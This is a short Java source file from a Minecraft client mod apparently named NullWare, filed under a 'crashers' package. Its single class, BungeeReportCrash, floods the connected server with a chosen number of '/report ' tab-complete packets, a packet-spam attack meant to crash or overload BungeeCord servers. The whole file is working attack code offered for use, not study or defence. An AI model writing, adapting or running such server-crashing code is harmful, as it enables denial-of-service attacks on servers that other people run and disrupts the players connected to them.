package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C14PacketTabComplete;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;

public class BungeeReportCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        sendMessage("Sending BungeeCord Report Packets...");
        for (int i = 0; i < packets; i++) {
            mc.getNetHandler().getNetworkManager().sendPacket(new C14PacketTabComplete("/report "));
        }
    }
}